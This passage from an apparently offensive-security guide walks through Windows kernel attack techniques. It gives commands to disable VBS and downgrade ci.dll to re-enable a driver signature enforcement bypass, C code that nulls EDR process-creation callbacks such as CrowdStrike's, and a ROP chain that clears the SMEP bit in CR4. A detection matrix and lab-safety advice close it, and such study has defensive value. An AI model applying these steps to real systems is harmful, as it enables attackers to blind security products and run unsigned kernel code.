│                              ┌──────────▼──────────┐                 │
│                              │  Downgrade ci.dll to │                 │
│                              │  10.0.22621.1376     │                 ��
│                              │  (pre-patch version) │                 │
│                              └──────────┬──────────┘                 │
│                                         │                              │
│                                    REBOOT                              │
│                                         │                              │
│                              ┌──────────▼──────────┐                 │
│                              │  Patched system now  │                 │
│                              │  vulnerable to       │                 │
│                              │  ItsNotASecBoundary  │                 │
│                              │  DSE bypass          │                 │
│                              └──────────┬──────────┘                 │
│                                         │                              │
│                              ┌──────────▼──────────┐                 │
│                              │  Load unsigned       │                 │
│                              │  kernel driver ✓     │                 │
│                              └──────────────────────┘                 │
└────────────────────────────────────────────────────────────────[...]
```

### Steps

```bash
# Disable VBS first (if no UEFI lock)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f

# OR invalidate SecureKernel.exe (if UEFI lock present)
# Rename/corrupt: C:\Windows\System32\SecureKernel.exe

# Run Downdate to downgrade ci.dll
WindowsDowndate.exe --component ci.dll --version 10.0.22621.1376

# Reboot
shutdown /r /t 0

# After reboot: trigger ItsNotASecurityBoundary race condition
# Load unsigned driver
```

> **CVE References:** CVE-2024-21302 (Windows Update privilege control), CVE-2024-38202 (Windows Backup elevation).

> **Mitigation:** Enable VBS with UEFI Lock AND Mandatory flag. Both are required. Without UEFI lock, VBS can be disabled via registry.

---

## Technique 18 — Kernel Callback Hijacking via DKOM Code Caves

### Concept

Windows registers **kernel callbacks** for process creation, thread creation, image loading, and registry operations. Security products (EDR/AV) use these callbacks heavily. Attackers in Ring 0 c[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                  Callback Array Manipulation                        │
│                                                                     │
│  PsSetCreateProcessNotifyRoutine callback array:                    │
│  [0] CrowdStrikeSensor.sys  ← EDR callback                        │
│  [1] MsMpEng.sys            ← Defender callback                    │
│  [2] SentinelOne.sys        ← EDR callback                        │
│                                                                     │
│  DKOM Attack — Zero out EDR entries:                               │
│  [0] 0x0000000000000000  ← Nulled                                  │
│  [1] 0x0000000000000000  ← Nulled                                  │
│  [2] 0x0000000000000000  ← Nulled                                  │
│                                                                     │
│  Result: Process creation events never reach EDR → invisible       │
└────────────────────────────────────────────────────────────────[...]
```

### Callback Removal Steps

```c
// Kernel driver code
// 1. Find callback array base via ntoskrnl pattern scan
// 2. Walk array entries
// 3. Identify target driver by comparing address ranges
// 4. Zero out the entry

PVOID* CallbackArray = FindCallbackArray(L"PspCreateProcessNotifyRoutine");

for (int i = 0; i < 64; i++) {
    PVOID entry = CallbackArray[i];
    if (IsAddressInDriver(entry, L"CrowdStrikeSensor.sys")) {
        CallbackArray[i] = NULL;  // Remove EDR callback
    }
}
```

> **Evasion:** KPP monitors callback arrays in modern Windows builds. To bypass, place stub in code cave of a legitimate driver that redirects to attacker callback — KPP sees a valid address ra[...]

---

## Technique 19 — SMEP / SMAP Bypass for Kernel Code Execution

### Concept

**SMEP (Supervisor Mode Execution Prevention)** prevents kernel-mode code from executing pages mapped in user-mode memory. **SMAP (Supervisor Mode Access Prevention)** prevents kernel-mode from r[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                    SMEP Bypass via CR4 Bit Clear                   │
│                                                                     │
│  Normal state:  CR4.SMEP = 1  (bit 20 set)                        │
│  SMEP active → kernel cannot execute user pages                     │
│                                                                     │
│  Bypass method 1: ROP chain to clear SMEP bit                     │
│  ──▶ Find ROP gadget: "mov cr4, rax; ret" in ntoskrnl             │
│  ──▶ Set RAX = CR4 value with bit 20 cleared                      │
│  ──▶ Execute gadget → SMEP disabled                                │
│  ──▶ Now execute user-space shellcode from kernel context          │
│                                                                     │
│  Bypass method 2: All-kernel ROP chain                            │
│  ──▶ Place shellcode in kernel pool (NX bypass needed)            │
│  ──▶ Use RWX kernel memory or flip NX bit on pool page            │
│  ──▶ Execute entirely in kernel space                              │
└────────────────────────────────────────────────────────────────[...]
```

### ROP Chain SMEP Disable

```python
# Python ROP chain construction (using pwntools/ROPgadget)
# 1. Find "mov cr4, rax; ret" gadget in ntoskrnl
rop_gadget = 0xfffff80012345678  # Example: ntoskrnl+0x1234

# 2. Get current CR4 value (bit 20 = SMEP, bit 21 = SMAP)
# CR4 default: 0x70678 with SMEP = 0x170678
smep_disabled_cr4 = 0x70678  # Bit 20 cleared

# 3. Build stack payload
payload  = b"A" * overflow_offset
payload += p64(pop_rax_ret)          # gadget: pop rax; ret
payload += p64(smep_disabled_cr4)    # value with SMEP bit cleared
payload += p64(rop_gadget)           # mov cr4, rax; ret
payload += p64(user_shellcode_addr)  # now executable from kernel
```

---

## Technique 20 — Cross-Signed Driver Program Abuse (Legacy Trust Chain)

### Concept

Before 2015, Microsoft allowed **cross-signing**: hardware vendors could sign their own root CA, and Microsoft would sign a certificate attesting that the vendor's CA was trusted. Drivers signed [...]

```
┌────────────────────────────────────────────────────────────────[...]
│                  Cross-Signed Driver Trust Chain                    │
│                                                                      │
│  Legacy (Pre-2015):                                                  │
│  [Driver] ──signed by──▶ [Vendor CA] ──cross-signed by──▶ [MSFT]  │
```

---

## Detection & Defense Matrix

| Technique | Detection Method | Defense/Mitigation |
|---|---|---|
| WHQL Abuse | Code behavior analysis, kernel hooking | Heuristic analysis, disable unsigned driver load |
| BYOVD | Vulnerable driver blocklist | Keep blocklist updated, disable admin user load |
| kdmapper | Kernel memory anomalies, hidden drivers | Kernel integrity checking, HVCI |
| ci.dll Downgrade | Detect VBS disable + ci.dll replacement | UEFI lock VBS settings, Secure Boot |
| ItsNotASecBoundary | Race condition detector in ci.dll | Apply KB5041160+, use DSE integrity checks |
| TestSigning | Registry scan, desktop watermark | GPO: disable bcdedit `/set testsigning`, audit boot config |
| Kernel Debugger | Debugger detection, KD port scanning | Disable debug mode, physical access controls |
| F8 Boot Option | Physical access control | UEFI Secure Boot mandatory |
| Stolen Cert | Revocation list updates, cert pinning | Revoke stolen certs promptly, monitor cert issuance |
| Fraudulent EV | Threat intel, WHCP submission auditing | EV certificate vetting, fraud prevention |
| DKOM | Kernel structure checksums, PatchGuard | Enable KPP + HVCI, kernel memory protection |
| Token Theft | Token history audit, anomalous privilege escalation | Audit token operations, behavioral EDR |
| Pool Overflow | Kernel heap canaries, exploit mitigations | Segment Heap, Type Isolation, NX Pool |
| Use-After-Free | Kernel pool tagging, UAF detector | Enable KASAN/MTE, update drivers |
| Race Condition | Temporal anomaly detection | Fix synchronization bugs, deploy patches |
| PatchGuard Bypass | KPP integrity monitoring | Modern Windows builds, HVCI enforcement |
| Windows Downdate | Component version tracking | Secure VBS + UEFI lock, audit WU operations |
| Callback Hijacking | Callback array checksums | KPP monitoring, code cave detection |
| SMEP/SMAP Bypass | CR4 bit monitoring, ROP detection | ROP prevention, hypervisor isolation |
| Cross-Signed Drivers | Certificate chain validation | Microsoft retired program post-2015 |

---

## Lab Setup Recommendations

### Minimum Requirements

- **Host:** Windows 10/11 Pro/Enterprise with VM capability
- **Guest:** Dedicated isolated VM (no network access during labs)
- **Kernel:** x64 architecture (all techniques are Ring 0)
- **Debugger:** WinDbg for kernel inspection

### Recommended Safety Measures

1. **Snapshot frequently** — revert after each technique test
2. **Air-gapped network** — no internet access to lab machine
3. **Hardware control** — physical disconnect from network
4. **Logging & monitoring** — capture all activity for analysis
5. **Incident response plan** — recovery procedures ready

### Tools & Resources

- **kdmapper:** https://github.com/TheCruZ/kdmapper
- **BYOVD Driver Collection:** Various GitHub repos (use caution)
- **Windows Driver Kit (WDK):** Microsoft's kernel development suite
- **WinDbg:** Windows Debugger (`windbg.exe`)
- **signtool:** Part of Windows SDK
- **Process Hacker:** Advanced process inspection tool
